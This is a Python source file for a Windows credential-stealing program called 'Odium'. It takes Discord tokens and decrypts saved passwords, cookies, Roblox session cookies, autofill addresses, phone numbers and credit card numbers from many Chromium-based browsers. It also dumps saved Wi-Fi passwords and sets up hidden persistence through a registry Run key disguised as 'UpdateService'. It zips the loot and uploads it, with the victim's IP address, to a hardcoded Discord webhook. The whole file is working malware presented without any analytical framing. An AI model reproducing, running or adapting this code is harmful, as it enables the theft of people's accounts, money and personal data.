import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes, Cryptodome.Cipher.AES
from threading import Thread
import win32crypt

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

tokenPaths = {
'Discord': f"{roaming}\\Discord",
'Discord Canary': f"{roaming}\\discordcanary",
'Discord PTB': f"{roaming}\\discordptb",
'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
'Opera': f"{roaming}\\Opera Software\\Opera Stable",
'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
}

config = {
	"Startup": True,
	"Hide_self": True,
	"webhook": 'https://discord.com/api/webhooks/1039097523643633684/-DWH0IuPWBN1SuX8Oh-7fnFs14TQfbp3yWgEcM0RGTzu4u2VyNsRxGqTUk-gclmEWWFv',
}

class main():
	def __init__(self):
		if config['Hide_self'] and sys.argv[0] == f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp/{os.path.basename(__file__)}': ctypes.windll.kernel32.SetFileAttributesW(os.path.basename(__file__), 0x02)

		self.tempfolder = os.path.join(os.getenv("TEMP"),''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
		os.mkdir(self.tempfolder)
		self.roblosecurity = []
		self.tokens = []
		self.fileList = []

		self.browserpaths = {
			'Opera': roaming + r'\\Opera Software\\Opera Stable',
			'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable',
			'Edge': local + r'\\Microsoft\\Edge\\User Data',
			'Chrome': local + r'\\Google\\Chrome\\User Data',
			'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data',
			'Brave': local + r'\\BraveSoftware\\Brave-Browser\\User Data',
			'Amigo': local + r'\\Amigo\\User Data',
			'Torch': local + r'\\Torch\\User Data',
			'Kometa': local + r'\\Kometa\\User Data',
			'Orbitum': local + r'\\Orbitum\\User Data',
			'CentBrowser': local + r'\\CentBrowser\\User Data',
			'7Star': local + r'\\7Star\\7Star\\User Data',
			'Sputnik': local + r'\\Sputnik\\Sputnik\\User Data',
			'Chrome SxS': local + r'\\Google\\Chrome SxS\\User Data',
			'Epic Privacy Browser': local + r'\\Epic Privacy Browser\\User Data',
			'Vivaldi': local + r'\\Vivaldi\\User Data',
			'Chrome Beta': local + r'\\Google\\Chrome Beta\\User Data',
			'Uran': local + r'\\uCozMedia\\Uran\\User Data',
			'Iridium': local + r'\\Iridium\\User Data',
			'Chromium': local + r'\\Chromium\\User Data'
		}

		for platform, path in tokenPaths.items():
			if os.path.exists(path): self.get_tokens(path)
		self.writeTokens()
		for plt, pth in self.browserpaths.items(): self.grabBrowserInfo(plt, pth)
		self.writeRoblox()
		self.grabwifi()

		if config["Startup"]: self.startup()

		self.zipup()
		self.send()
		self.cleanup()

	def system(self, action):
		return '\n'.join(line for line in subprocess.check_output(action, creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip())

	def decrypt_token(self, buff, master_key):
		try:
			return Cryptodome.Cipher.AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], Cryptodome.Cipher.AES.MODE_GCM,
						   buff[3:15]).decrypt(buff[15:])[:-16].decode()
		except: pass

	def get_master_key(self, path) -> str:
		with open(path, "r", encoding="utf-8") as f: local_state = f.read()
		local_state = json.loads(local_state)
		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		master_key = master_key[5:]
		master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
		return master_key

	def decrypt_val(self, buff, master_key) -> str:
		try:
			iv = buff[3:15]
			payload = buff[15:]
			cipher = Cryptodome.Cipher.AES.new(master_key, Cryptodome.Cipher.AES.MODE_GCM, iv)
			decrypted_pass = cipher.decrypt(payload)
			decrypted_pass = decrypted_pass[:-16].decode()
			return decrypted_pass
		except Exception: return f'Failed to decrypt "{str(buff)}" | Key: "{str(master_key)}"'


	def bypassBetterDiscord(self):
		bd = roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
		if os.path.exists(bd):
			with open(bd, 'r', encoding="utf8", errors='ignore') as f:
				txt = f.read()
				content = txt.replace('api/webhooks', 'api/nethooks')
			with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)

	def startup(self):
		file = os.path.basename(__file__)
		try: self.system("powershell Get-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name UpdateService")
		except:
			try: os.mkdir(f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp")
			except: pass
			shutil.copyfile(sys.argv[0], f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp/{file}')
			self.system(f"powershell New-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateService' -value 'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp/{file}' -PropertyType STRING")
		

	def get_tokens(self, path):
		cleaned = []
		tokens = []
		done = []
		lev_db = f"{path}\\Local Storage\\leveldb\\"
		loc_state = f"{path}\\Local State"
		# new method with encryption
		if os.path.exists(loc_state):
			with open(loc_state, "r") as file:
				key = json.loads(file.read())['os_crypt']['encrypted_key']
			for file in os.listdir(lev_db):
				if not file.endswith(".ldb") and file.endswith(".log"):
					continue
				else:
					try:
						with open(lev_db + file, "r", errors='ignore') as files:
							for x in files.readlines():
								x.strip()
								for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
									tokens.append(values)
					except PermissionError:
						continue
			for i in tokens:
				if i.endswith("\\"):
					i.replace("\\", "")
				elif i not in cleaned:
					cleaned.append(i)
			for token in cleaned:
				done += [self.decrypt_token(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])]

		else:  # old method without encryption
			for file_name in os.listdir(path):
				try:
					if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
						continue
					for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
						for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
							for token in re.findall(regex, line):
								done.append(token)
				except:
					continue
		for tkn in done:
			headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11", "Authorization": tkn}
			r = requests.get(url='https://discord.com/api/v9/users/@me', headers=headers)
			if r.status_code == 200 and not tkn in self.tokens: self.tokens.append(tkn)
		return done

	def writeTokens(self):              
		for token in self.tokens:
			r = requests.get(url='https://discord.com/api/v9/users/@me', headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11", "Authorization": token}).json()
			open(os.path.join(self.tempfolder, "Discord.txt"), 'a').write(r["username"]+"#"+r["discriminator"]+"\n"+token+"\n\n")

	def grabBrowserInfo(self, platform, path):
		if os.path.exists(path):
			self.passwords_temp = self.cookies_temp = self.misc_temp = self.formatted_cookies = ''
			sep = '='*40
			fname = lambda x: f'\\{platform} Info ({x}).txt'
			formatter = lambda p, c, m: f'Browser: {platform}\n\n{sep}\n               PASSWORDS\n{sep}\n\n{p}\n{sep}\n                COOKIES\n{sep}\n\n{c}\n{sep}\n               OTHER INFO\n{sep}\n\n{m}'
			profiles = ['Default']
			for dir in os.listdir(path):
				if dir.startswith('Profile ') and os.path.isdir(dir): profiles.append(dir)
			if platform in [
				'Opera',
				'Opera GX',
				'Amigo',
				'Torch',
				'Kometa',
				'Orbitum',
				'CentBrowser',
				'7Star',
				'Sputnik',
				'Chrome SxS',
				'Epic Privacy Browser',
			]:
				cpath = path + '\\Network\\Cookies'
				ppath = path + '\\Login Data'
				wpath = path + '\\Web Data'
				mkpath = path + '\\Local State'
				fname = f'\\{platform} Info (Default).txt'
				threads = [
					Thread(target=self.grabPasswords,args=[mkpath,platform,'Default',ppath]),
					Thread(target=self.grabCookies,args=[mkpath,platform,'Default',cpath]),
					Thread(target=self.grabMisc,args=[mkpath,platform,'Default',wpath])
				]
				for x in threads:
					x.start()
				for x in threads:
					x.join()
				
				try: self.grabPasswords(mkpath,fname,ppath); self.grabCookies(mkpath,fname,cpath); self.grabMisc(mkpath,fname,wpath)
				except Exception: pass
			else:
				for profile in profiles:
					cpath = path + f'\\{profile}\\Network\\Cookies'
					ppath = path + f'\\{profile}\\Login Data'
					wpath = path + f'\\{profile}\\Web Data'
					mkpath = path + '\\Local State'
					fname = f'\\{platform} Info ({profile}).txt'
					threads = [
						Thread(target=self.grabPasswords,args=[mkpath,platform,profile,ppath]),
						Thread(target=self.grabCookies,args=[mkpath,platform,profile,cpath]),
						Thread(target=self.grabMisc,args=[mkpath,platform,profile,wpath])
					]
					for x in threads:
						x.start()
					for x in threads:
						x.join()
			with open(self.tempfolder+f'\\{platform} Cookies ({profile}).txt', "w", encoding="utf8", errors='ignore') as m, open(self.tempfolder+fname, "w", encoding="utf8", errors='ignore') as f:
				if self.formatted_cookies:
					m.write(self.formatted_cookies)
				else:
					m.close()
					os.remove(self.tempfolder+f'\\{platform} Cookies ({profile}).txt')
				
				if self.passwords_temp or self.cookies_temp or self.misc_temp:
					f.write(formatter(self.passwords_temp, self.cookies_temp, self.misc_temp))
				else:
					f.close()
					os.remove(self.tempfolder+fname)
					
	def grabPasswords(self,mkp,bname,pname,data):
		self.passwords_temp = ''
		newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_PASSWORDS.db'.replace(' ','_'))
		master_key = self.get_master_key(mkp)
		login_db = data
		try: shutil.copy2(login_db, newdb)
		except Exception: pass
		conn = sqlite3.connect(newdb)
		cursor = conn.cursor()
		try:
			cursor.execute("SELECT action_url, username_value, password_value FROM logins")
			for r in cursor.fetchall():
				url = r[0]
				username = r[1]
				encrypted_password = r[2]
				decrypted_password = self.decrypt_val(encrypted_password, master_key)
				if url != "":
					self.passwords_temp += f"\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n"
		except Exception: pass
		cursor.close()
		conn.close()
		try: os.remove(newdb)
		except Exception: pass

	def grabCookies(self,mkp,bname,pname,data):
		self.cookies_temp = ''
		self.formatted_cookies = ''
		newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_COOKIES.db'.replace(' ','_'))
		master_key = self.get_master_key(mkp)
		login_db = data
		try: shutil.copy2(login_db, newdb)
		except Exception: pass
		conn = sqlite3.connect(newdb)
		cursor = conn.cursor()
		try:
			cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
			for r in cursor.fetchall():
				host = r[0]
				user = r[1]
				decrypted_cookie = self.decrypt_val(r[2], master_key)
				if host != "":
					self.cookies_temp += f"\nHost: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n"
					self.formatted_cookies += f"{host}	TRUE	/	FALSE	1708726694	{user}	{decrypted_cookie}\n"
				if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.roblosecurity.append(decrypted_cookie)
		except Exception: pass
		cursor.close()
		conn.close()
		try: os.remove(newdb)
		except Exception: pass

	def grabMisc(self,mkp,bname,pname,data):
		self.misc_temp = ''
		newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_WEBDATA.db'.replace(' ','_'))
		master_key = self.get_master_key(mkp)
		login_db = data
		try: shutil.copy2(login_db, newdb)
		except Exception: pass
		conn = sqlite3.connect(newdb)
		cursor = conn.cursor()
		try:
			cursor.execute("SELECT street_address, city, state, zipcode FROM autofill_profiles")
			for r in cursor.fetchall():
				Address = r[0]
				City = r[1]
				State = r[2]
				ZIP = r[3]
				if Address != "":
					self.misc_temp += f"\nAddress: {Address}\nCity: {City}\nState: {State}\nZIP Code: {ZIP}\n"
			cursor.execute("SELECT number FROM autofill_profile_phones")
			for r in cursor.fetchall():
				Number = r[0]
				if Number != "":
					self.misc_temp += f"\nPhone Number: {Number}\n"
			cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
			for r in cursor.fetchall():
				Name = r[0]
				ExpM = r[1]
				ExpY = r[2]
				decrypted_card = self.decrypt_val(r[3], master_key)
				if decrypted_card != "":
					self.misc_temp += f"\nCard Number: {decrypted_card}\nName on Card: {Name}\nExpiration Month: {ExpM}\nExpiration Year: {ExpY}\n"
		except Exception: pass
		cursor.close()
		conn.close()
		try: os.remove(newdb)
		except Exception: pass

	def grabwifi(self):
		self.wifi_list = []
		self.name_pass = {}
		data = subprocess.getoutput('netsh wlan show profiles').split('\n')
		for line in data:
			if 'All User Profile' in line:
				self.wifi_list.append(line.split(":")[-1][1:])
			else:
				continue

		for i in self.wifi_list:
			command = subprocess.getoutput(
				f'netsh wlan show profile "{i}" key=clear')

			if "Key Content" in command:
				split_key = command.split('Key Content')
				tmp = split_key[1].split('\n')[0]
				key = tmp.split(': ')[1]
				self.name_pass[i] = key
			else:
				key = ""
				self.name_pass[i] = key

			with open(self.tempfolder + ".\\wifi.txt", "a") as f:
				for i, j in self.name_pass.items():
					f.write(f'Wifi Name: {i}\n Password: {j}\n\n')
			f.close()
			if open(os.path.join(self.tempfolder, "wifi.txt", 'r').read() == "": os.remove(os.path.join(self.tempfolder, f))

	def writeRoblox(self):
		res = [*set(self.roblosecurity)]
		open(os.path.join(self.tempfolder, "Roblox.txt"), 'a').write('\n\n'.join(res))
	
	def zipup(self):
		with zipfile.ZipFile(os.path.join("C:/Users/"+os.getlogin(), os.getlogin()+"-Odium.zip"), 'a') as zip:
			for file in os.listdir(self.tempfolder):
				zip.write(os.path.join(self.tempfolder, file), arcname=file)
			zip.close()
			for file in zip.namelist(): self.fileList.append(file)
	
	def cleanup(self):
		for file in os.listdir(self.tempfolder):
			os.remove(os.path.join(self.tempfolder, file))
		os.rmdir(self.tempfolder)
		os.remove(os.path.join("C:/Users/"+os.getlogin(), os.getlogin()+"-Odium.zip"))
		

	def send(self):
		if self.fileList: files = "\u001b[32mFiles:\u001b[35m\n"+' \n'.join(self.fileList)
		else: files = "No files found"
		data = requests.get("https://ipinfo.io/json").json()
		ip = data["ip"]
		embed = {
			"username": f"{os.getlogin()} - Odium",
			"avatar_url":"https://imgur.com/7lO4eJI.jpg",
			"embeds": [
				{
					"name": "**Files**",
					"description": f"**Login: **{os.getlogin()}\n**IP:** {ip}\n\n```ansi\n{files}```",
					"color": 10181046,
					"timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
				}
			]
		}
		fileEmbed = {
			"username": f"{os.getlogin()} - Odium",
			"avatar_url":"https://imgur.com/7lO4eJI.jpg"
		}

		with open(os.path.join("C:/Users/"+os.getlogin(), os.getlogin()+"-Odium.zip"), 'rb') as zipfile:
			if not zipfile.read() == []:			
				with open(os.path.join("C:/Users/"+os.getlogin(), os.getlogin()+"-Odium.zip"),'rb') as infozip:
					requests.post(config["webhook"], json=embed)
					requests.post(config["webhook"], data=fileEmbed, files={'upload_file': infozip})

if __name__ == "__main__":
	main()
